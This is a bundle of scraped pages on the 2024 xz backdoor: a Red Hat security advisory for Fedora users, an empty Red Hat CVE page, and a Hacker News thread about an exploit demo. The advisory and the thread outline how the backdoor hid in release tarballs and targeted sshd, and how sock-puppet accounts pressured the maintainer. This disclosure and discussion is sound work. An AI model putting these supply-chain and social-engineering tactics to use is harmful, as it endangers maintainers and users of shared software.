* [한국어](/ko/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Português](/pt-br/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Español](/es/blog/urgent-security-alert-fedora-40-and-rawhide-users)

[Red Hat Blog](/en/blog)

* [By product](/en/blog/product)
  + [Red Hat Enterprise Linux](/en/blog/channel/red-hat-enterprise-linux "Red Hat Enterprise Linux")
  + [Red Hat OpenShift](/en/blog/channel/red-hat-openshift "Red Hat OpenShift")
  + [Red Hat Ansible Automation Platform](/en/blog/channel/red-hat-ansible-automation "Red Hat Ansible Automation Platform")

  ---

  [All products](/en/blog/products "All products")
* [By channel](/en/blog)
  + [AI](/en/blog/channel/artificial-intelligence "AI")
  + [Virtualization](/en/blog/channel/red-hat-virtualization "Virtualization")
  + [Applications](/en/blog/channel/applications "Applications")
  + [Automation](/en/blog/channel/management-and-automation "Automation")
  + [Cloud services](/en/blog/channel/cloud-services "Cloud services")
  + [Edge computing](/en/blog/channel/edge-computing "Edge computing")
  + [Infrastructure](/en/blog/channel/infrastructure "Infrastructure")
  + [Open hybrid cloud](/en/blog/channel/hybrid-cloud-infrastructure "Open hybrid cloud")
  + [Original shows](/en/red-hat-original-series "Original shows")
  + [Security](/en/blog/channel/security "Security")

  ---

  [All channels](/en/blog/channels "All channels")

[Subscribe to the feed](/en/rss/blog "Subscribe to the feed")

# Urgent security alert for Fedora Linux 40 and Fedora Rawhide users

March 29, 2024*3*-minute read
[Linux](/en/blog?f[0]=taxonomy_topic_tid:27061#rhdc-search-listing ) [Open source](/en/blog?f[0]=taxonomy_topic_tid:17391#rhdc-search-listing ) [Open source communities](/en/blog?f[0]=taxonomy_topic_tid:27071#rhdc-search-listing ) [Security](/en/blog?f[0]=taxonomy_topic_tid:4491#rhdc-search-listing )

Share

Subscribe

* [Back to all posts](/en/blog)

---

***No versions of Red Hat Enterprise Linux (RHEL) are affected by this CVE.***

*Updated March 30, 2024: We have determined that Fedora Linux 40 beta does contain two affected versions of xz libraries - xz-libs-5.6.0-1.fc40.x86\_64.rpm and xz-libs-5.6.0-2.fc40.x86\_64.rpm. At this time, Fedora 40 Linux does not appear to be affected by the actual malware exploit, but we encourage all Fedora 40 Linux beta users to revert to 5.4.x versions.*

*Editor's note: This post has been updated to more clearly articulate the affected versions of Fedora Linux and add additional mitigation methods.*

Yesterday, Red Hat Information Risk and Security and Red Hat Product Security learned that the latest versions of the “xz” tools and libraries**contain** [**malicious code**](https://www.openwall.com/lists/oss-security/2024/03/29/4) **that appears to be intended to allow unauthorized access. Specifically, this code is present in versions 5.6.0 and 5.6.1 of the libraries**. Fedora Linux 40 users may have received version 5.6.0, depending on the timing of system updates. Fedora Rawhide users may have received version 5.6.0 or 5.6.1.This vulnerability was assigned [CVE-2024-3094](https://access.redhat.com/security/cve/CVE-2024-3094).

**PLEASE IMMEDIATELY STOP USAGE OF ANY FEDORA RAWHIDE INSTANCES** for work or personal activity. Fedora Rawhide will be reverted to xz-5.4.x shortly, and once that is done, Fedora Rawhide instances can safely be redeployed. *Note that Fedora Rawhide is the development distribution of Fedora Linux, and serves as the basis for future Fedora Linux builds (in this case, the yet-to-be-released Fedora Linux 41).*

**At this time the Fedora Linux 40 builds have not been shown to be compromised.** We believe the malicious code injection did not take effect in these builds. However, Fedora Linux 40 users should still downgrade to a 5.4 build to be safe. An update that reverts xz to 5.4.x has recently been published and is becoming available to Fedora Linux 40 users through the normal update system. Concerned users can force the update by following the instructions at <https://bodhi.fedoraproject.org/updates/FEDORA-2024-d02c7bb266.>

*Updated March 30, 2024: We have determined that Fedora Linux 40 beta does contain two affected versions of xz libraries - xz-libs-5.6.0-1.fc40.x86\_64.rpm and xz-libs-5.6.0-2.fc40.x86\_64.rpm. At this time, Fedora 40 Linux does not appear to be affected by the actual malware exploit, but we encourage all Fedora 40 Linux beta users to revert to 5.4.x versions.*

## What is xz?

xz is a general purpose data compression format present in nearly every Linux distribution, both community projects and commercial product distributions. Essentially, it helps compress (and then decompress) large file formats into smaller, more manageable sizes for sharing via file transfers.

## What is the malicious code?

The malicious injection present in the xz versions 5.6.0 and 5.6.1 libraries is obfuscated and only included in full in the download package - the Git distribution lacks the M4 macro that triggers the build of the malicious code. The second-stage artifacts are present in the Git repository for the injection during the build time, in case the malicious M4 macro is present.

The resulting malicious build interferes with authentication in sshd via systemd.  SSH is a commonly used protocol for connecting remotely to systems, and sshd is the service that allows access.  **Under the right circumstances this interference could potentially enable a malicious actor to break sshd authentication and gain unauthorized access to the entire system remotely.**

## What distributions are affected by this malicious code?

Current investigation indicates that the packages are only present in Fedora 40 and Fedora Rawhide within the Red Hat community ecosystem.

We have reports and evidence of the injections successfully building in xz 5.6.x versions built for Debian unstable (Sid). Other distributions may also be affected. Users of other distributions should consult with their distributors for guidance.

## What should I do if I am running an affected distribution?

For both personal and business activities, immediately stop using Fedora 40 or Fedora Rawhide until you can downgrade your xz version. If you are using an affected distribution in a business setting, we encourage you to contact your information security team for next steps.

Additionally, for those running openSUSE distributions, SUSE has published a downgrade procedure at <https://build.opensuse.org/request/show/1163302>.

---

Enter keywords here to search blogs

UI\_Icon-Red\_Hat-Close-A-Black-RGB

Search

## More like this

### [Blog post](/en/blog/top-10-linux-articles-2024)

#### [10 Linux blog posts to bookmark now](/en/blog/top-10-linux-articles-2024)

### [Blog post](/en/blog/build-rhel-10-beta-insights-image-builder)

#### [Build RHEL 10 Beta with Insights Image Builder](/en/blog/build-rhel-10-beta-insights-image-builder)

### [Original shows](/en/technically-speaking/building-trust-in-AI)

#### [Technically Speaking | Building trust in Enterprise AI](/en/technically-speaking/building-trust-in-AI)

### [Original shows](/en/compiler-podcast/netcode)

#### [The Truth About Netcode | Compiler](/en/compiler-podcast/netcode)

## Keep exploring

* [Checklist: 4 ways to improve cloud securityChecklist](/en/engage/4-ways-improve-20220817?intcmp=7013a000003Sq0iAAC "4 ways to improve cloud security")
* [Security approaches for hybrid cloud environmentsWhitepaper](/en/engage/hybrid-cloud-environments-s-202112070640?intcmp=7013a000003Sq0iAAC "Security approaches for hybrid cloud environments")
* [A layered approach to container and Kubernetes securityWhitepaper](/en/engage/container-security-20170802?intcmp=7013a000003Sq0iAAC "A layered approach to container and Kubernetes security")

## Browse by channel

[Explore all channels](/en/blog/channels "Explore all channels")

![automation icon](https://www.redhat.com/cms/managed-files/automation.svg)
### [Automation](/en/blog/channel/management-and-automation)

The latest on IT automation for tech, teams, and environments

![AI icon](https://www.redhat.com/cms/managed-files/AI.svg)
### [Artificial intelligence](/en/blog/channel/artificial-intelligence)

Updates on the platforms that free customers to run AI workloads anywhere

![open hybrid cloud icon](https://www.redhat.com/cms/managed-files/open-hybrid-cloud.svg)
### [Open hybrid cloud](/en/blog/channel/hybrid-cloud-infrastructure)

Explore how we build a more flexible future with hybrid cloud

![security icon](https://www.redhat.com/cms/managed-files/security.svg)
### [Security](/en/blog/channel/security)

The latest on how we reduce risks across environments and technologies

![edge icon](https://www.redhat.com/cms/managed-files/edge_2.svg)
### [Edge computing](/en/blog/channel/edge-computing)

Updates on the platforms that simplify operations at the edge

![Infrastructure icon](https://www.redhat.com/cms/managed-files/infrastructure.svg)
### [Infrastructure](/en/blog/channel/infrastructure)

The latest on the world’s leading enterprise Linux platform

![application development icon](https://www.redhat.com/cms/managed-files/application-development.svg)
### [Applications](/en/blog/channel/applications)

Inside our solutions to the toughest application challenges

![Original series icon](https://www.redhat.com/cms/managed-files/original-series.svg)
### [Original shows](/en/red-hat-original-series)

Entertaining stories from the makers and leaders in enterprise tech

[![Red Hat logo](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](/en)[LinkedIn](https://www.linkedin.com/company/red-hat)[YouTube](https://www.youtube.com/user/RedHatVideos)[Facebook](https://www.facebook.com/redhatinc)[X](https://twitter.com/RedHat)
### Products

* [Red Hat Enterprise Linux](/en/technologies/linux-platforms/enterprise-linux)
* [Red Hat OpenShift](/en/technologies/cloud-computing/openshift)
* [Red Hat Ansible Automation Platform](/en/technologies/management/ansible)
* [Cloud services](/en/technologies/cloud-computing/openshift/cloud-services)
* [See all products](/en/technologies/all-products)

### Tools

* [Training and certification](/en/services/training-and-certification)
* [My account](https://www.redhat.com/wapps/ugc/protected/personalInfo.html)
* [Customer support](https://access.redhat.com)
* [Developer resources](https://developers.redhat.com/)
* [Find a partner](https://catalog.redhat.com/partners)
* [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)
* [Red Hat value calculator](/en/solutions/value-calculator)
* [Documentation](https://docs.redhat.com/en)

### Try, buy, & sell

* [Product trial center](/en/products/trials)
* [Red Hat Marketplace](https://marketplace.redhat.com)
* [Red Hat Store](https://www.redhat.com/en/store)
* [Buy online (Japan)](https://www.redhat.com/en/about/japan-buy)
* [Console](https://cloud.redhat.com/)

### Communicate

* [Contact sales](/en/contact/sales)
* [Contact customer service](/en/contact/customer-service)
* [Contact training](/en/services/training-and-certification/contact-us)
* [Social](/en/about/social)

### About Red Hat

We’re the world’s leading provider of enterprise open source solutions—including Linux, cloud, container, and Kubernetes. We deliver hardened solutions that make it easier for enterprises to work across platforms and environments, from the core datacenter to the network edge.

### Select a language

![](https://static.redhat.com/libs/redhat/rh-iconfont/4/svg/web-icon-globe.svg)

* [简体中文](/zh/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [English](/en/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Français](/fr/blog/urgent-security-alert-fedora-41-and-rawhide-users)
* [Deutsch](/de/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Italiano](/it/blog/urgent-security-alert-fedora-41-and-rawhide-users)
* [日本語](/ja/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [한국어](/ko/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Português](/pt-br/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Español](/es/blog/urgent-security-alert-fedora-40-and-rawhide-users)
### Red Hat legal and privacy links

* [About Red Hat](/en/about/company)
* [Jobs](/en/jobs)
* [Events](/en/events)
* [Locations](/en/about/office-locations)
* [Contact Red Hat](/en/contact)
* [Red Hat Blog](/en/blog)
* [Diversity, equity, and inclusion](/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

© 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](/en/about/privacy-policy)
* [Terms of use](/en/about/terms-use)
* [All policies and guidelines](/en/about/all-policies-guidelines)
* [Digital accessibility](/en/about/digital-accessibility)



=== Content from twitter.com_01cd6469_20250111_034038.html ===



=== Content from access.redhat.com_11bfd005_20250111_034003.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2024 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from news.ycombinator.com_a41ea8da_20250111_034034.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D39895344) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Xzbot: Notes, honeypot, and exploit demo for the xz backdoor](https://github.com/amlweems/xzbot) ([github.com/amlweems](from?site=github.com/amlweems)) | | --- | --- | --- | |  | | 849 points by [q3k](user?id=q3k) [9 months ago](item?id=39895344)  | [hide](hide?id=39895344&goto=item%3Fid%3D39895344) | [past](https://hn.algolia.com/?query=Xzbot%3A%20Notes%2C%20honeypot%2C%20and%20exploit%20demo%20for%20the%20xz%20backdoor&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=39895344&auth=293f232c376eaaa7b9216876af93c1c29edf5318) | [469 comments](item?id=39895344) |  | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39896221)   | [next](#39902555) [–]  It's pretty interesting that they didn't just introduce an RCE that anyone can exploit, it requires the attacker's private key. It's ironically a very security conscious vulnerability. | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [haswell](user?id=haswell) [9 months ago](item?id=39896392)   | [parent](#39896221) | [next](#39898665) [–]  I suspect the original rationale is about preserving the longevity of the backdoor. If you blow a hole wide open that anyone can enter, it’s going to be found and shut down quickly. If this hadn’t had the performance impact that brought it quickly to the surface, it’s possible that this would have lived quietly for a long time exactly because it’s not widely exploitable. | | --- | --- | --- | | | |  |  | [eli](user?id=eli) [9 months ago](item?id=39898419)   | [root](#39896221) | [parent](#39896392) | [next](#39897179) [–]  More to the point it prevents your enemies from using the exploit against friendly targets. The tradeoff is that, once you find it, it's very clearly a backdoor. No way you can pretend this was an innocent bug. | | --- | --- | --- | | | |  |  | [declan\_roberts](user?id=declan_roberts) [9 months ago](item?id=39897179)   | [root](#39896221) | [parent](#39896392) | [prev](#39898419) | [next](#39899313) [–]  I agree that this is probably about persistence. Initially I thought the developer was playing the long-con to dump some crypto exchange and make off with literally a billion dollars or more. But if that was the case they wouldn't bother with the key. It'd be a one-and-done situation. It would be a stop-the-world event. Now it looks more like nation-state spycraft. | | --- | --- | --- | | | |  |  | [btown](user?id=btown) [9 months ago](item?id=39897999)   | [root](#39896221) | [parent](#39897179) | [next](#39897792) [–]  It's worth also noting that the spycraft involved a coordinated harassment campaign of the original maintainer, with multiple writing styles, to accelerate a transition of maintainership to the attacker: [https://www.mail-archive.com/xz-devel@tukaani.org/msg00566.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00566.html) [https://www.mail-archive.com/xz-devel@tukaani.org/msg00568.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00568.html) [https://www.mail-archive.com/xz-devel@tukaani.org/msg00569.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00569.html) While this doesn't prove nation-state involvement, it certainly borrows from a wide-ranging playbook of techniques. | | --- | --- | --- | | | |  |  | [mrkramer](user?id=mrkramer) [9 months ago](item?id=39898806)   | [root](#39896221) | [parent](#39897999) | [next](#39898785) [–]  At first I thought the guy who did this was a lone wolf but now I believe it was indeed state actor. They coordinated and harassed original maintainer into giving them access to the project, basically they hijacked the open source project. The poor guy(the original maintainer) was alone against state actor who was persistent with the goal of hijacking and then backdooring the open source project. It seems like they were actively looking[0] which open source compression library they can inject with vulnerable code and then exploit and backdoor afterwards. [0] <https://lwn.net/Articles/967763/> | | --- | --- | --- | | | |  |  | [sofixa](user?id=sofixa) [9 months ago](item?id=39904158)   | [root](#39896221) | [parent](#39898806) | [next](#39903218) [–]  > At first I thought the guy who did this was a lone wolf but now I believe it was indeed state actor. They coordinated and harassed original maintainer into giving them access to the project, basically they hijacked the open source project. The poor guy(the original maintainer) was alone against state actor who was persistent with the goal of hijacking and then backdooring the open source project. It could just as easily be a lone wolf capable of writing in different styles (really not difficult if one spends enough time online, one gets exposed to all sorts of styles) or even just your run of the mill criminal gang. In fact, "multiaccount" cheating (where a single person has multiple accounts that interact with one another in a favourable manner, e.g. trading for stuff for reduced fees, or letting themselves be killed to pad stats, or expressing opinions leaving the impression of mass support, etc.) has been present in many MMO games for more than a decade. I recall an online game I was really into back in high school, eRepublik, which simulated real world politics, economics and warfare (in a really dumbed down version of course), and multiacounts were especially prevalent in politics, where candidates for election would often be padded by fake groups, or even entire countries being taken over by a gang of real people with like ten accounts each. The complexity is nothing new. The only indicator this could be a state actor is the long con aspect of it. The attacker(s) were looking into *years* between starting and actually being able to exploit. | | --- | --- | --- | | | |  |  | [pyinstallwoes](user?id=pyinstallwoes) [9 months ago](item?id=39903218)   | [root](#39896221) | [parent](#39898806) | [prev](#39904158) | [next](#39899304) [–]  > “Recently I've worked off-list a bit with Jia Tan on XZ Utils and” > "In 2021, JiaT75 submitted a pull request to the libarchive repository with the title ‘Added error text to warning when untaring with bsdtar’ which seemed legitimate at first glance. " Seems “Jia” is related to both | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39899304)   | [root](#39896221) | [parent](#39898806) | [prev](#39903218) | [next](#39898785) [–]  Reading that link, it seems like the vulnerability is that a file name gets printed, so you can add terminal control characters in a file name and have it printed. [https://github.com/libarchive/libarchive/pull/1609#issuecomm...](https://github.com/libarchive/libarchive/pull/1609#issuecomment-2028125584) | | --- | --- | --- | | | |  |  | [allanbreyes](user?id=allanbreyes) [9 months ago](item?id=39898785)   | [root](#39896221) | [parent](#39897999) | [prev](#39898806) | [next](#39899810) [–]  Ugh, that this psyops sockpuppetry may have started or contributed to the maintainer's mental health issues seems like the most depressing part of all this. Maintaining OSS is hard enough. | | --- | --- | --- | | | |  |  | [btown](user?id=btown) [9 months ago](item?id=39899213)   | [root](#39896221) | [parent](#39898785) | [next](#39900799) [–]  I hope that one takeaway from this entire situation is that if you're a maintainer and your users are pushing you outside your levels of comfort, that's a reflection on them, not on you - and that it could be reflective of something far, far worse than just their impatience. If you, as a maintainer, value stability of not only your software but also your own mental health, it is *entirely* something you can be proud of to resist calls for new features, scope increases, and rapid team additions. | | --- | --- | --- | | | |  |  | [heavyset\_go](user?id=heavyset_go) [9 months ago](item?id=39900799)   | [root](#39896221) | [parent](#39898785) | [prev](#39899213) | [next](#39899183) [–]  Yeah, that was a hard read. I think it highlights the importance of emotionally distancing yourself from your projects. It's also interesting because it exploits the current zeitgeist when it comes to maintainers' responsibilities to their users and communities. Personally, I think it puts too much expectation on maintainers' shoulders, especially when they're working for free. Personally, I think maintainers are doing favors for users, and if they don't like how the project is progressing or not, then too bad. That's not a popular sentiment, though. | | --- | --- | --- | | | |  |  | [\_\_MatrixMan\_\_](user?id=__MatrixMan__) [9 months ago](item?id=39899183)   | [root](#39896221) | [parent](#39898785) | [prev](#39900799) | [next](#39899561) [–]  No good deed goes unpunished, what a shame. | | --- | --- | --- | | | |  |  | [Delk](user?id=Delk) [9 months ago](item?id=39899561)   | [root](#39896221) | [parent](#39898785) | [prev](#39899183) | [next](#39899810) [–]  Probably didn't start them, considering that he already mentioned (long-term) mental health issues in the mailing list discussion in which the (likely) sock puppets started making demands. But it's hard to see the whole thing helping, and it is some combination of depressing and infuriating. I hope he's doing ok. | | --- | --- | --- | | | |  |  | [tapland](user?id=tapland) [9 months ago](item?id=39900586)   | [root](#39896221) | [parent](#39899561) | [next](#39899810) [–]  You only push after you've established your guy as the likely successor. If this was coordinated it was not the first move. | | --- | --- | --- | | | |  |  | [furstenheim](user?id=furstenheim) [9 months ago](item?id=39899810)   | [root](#39896221) | [parent](#39897999) | [prev](#39898785) | [next](#39902591) [–]  I actually wondered how many packages they harassed until they got access to one such | | --- | --- | --- | | | |  |  | [metrxqin](user?id=metrxqin) [9 months ago](item?id=39902591)   | [root](#39896221) | [parent](#39897999) | [prev](#39899810) | [next](#39899101) [–]  I'm literally shocked by the conversations in the mail-list, it's blatantly an exploitation of others' kindness. | | --- | --- | --- | | | |  |  | [Voultapher](user?id=Voultapher) [9 months ago](item?id=39899101)   | [root](#39896221) | [parent](#39897999) | [prev](#39902591) | [next](#39899418) [–]  I mean one person can use sock puppet accounts to write emails. | | --- | --- | --- | | | |  |  | [yread](user?id=yread) [9 months ago](item?id=39899418)   | [root](#39896221) | [parent](#39897999) | [prev](#39899101) | [next](#39897792) [–]  Maybe they weren't all sockpuppets. Here Jigar Kumar was nitpicking Jia Tan's changes: [https://www.mail-archive.com/xz-devel@tukaani.org/msg00556.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00556.html) That was not necessary to gain trust. Writing style is different, too. Later when Jia gained commit access he reminds him to merge it. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39900302)   | [root](#39896221) | [parent](#39899418) | [next](#39899787) [–]  This looks like a very phony "debate". I think the most convincing case made about the sock puppets is around account creation dates, and also people disappearing after they get what they need. Like Jigar disappearing after Jia becomes maintainer. Or the guy "misoeater19" who creates his debian bug tracker account to say that his work is totally blocked on needing xz 5.6.1 to be in debian unstable. | | --- | --- | --- | | | |  |  | [pyinstallwoes](user?id=pyinstallwoes) [9 months ago](item?id=39903227)   | [root](#39896221) | [parent](#39900302) | [next](#39899787) [–]  Ah, the good ol’ lever of urgency. Urgency frequency smells of deception. | | --- | --- | --- | | | |  |  | [barkingcat](user?id=barkingcat) [9 months ago](item?id=39899787)   | [root](#39896221) | [parent](#39899418) | [prev](#39900302) | [next](#39897792) [–]  that's precisely what sock puppetry does ... talk/write in a different writing style to make others believe it's different people. | | --- | --- | --- | | | |  |  | [bdowling](user?id=bdowling) [9 months ago](item?id=39902569)   | [root](#39896221) | [parent](#39899787) | [next](#39897792) [–]  For all we know there is a whole cyber-squadron (or whatever their military units are called) behind Jia Tan and other accounts. | | --- | --- | --- | | | |  |  | [meowface](user?id=meowface) [9 months ago](item?id=39897792)   | [root](#39896221) | [parent](#39897179) | [prev](#39897999) | [next](#39900218) [–]  >But if that was the case they wouldn't bother with the key. It'd be a one-and-done situation. It would be a stop-the-world event. Why not? It's possible someone else could've discovered the exploit before the big attack but decided not to disclose it. 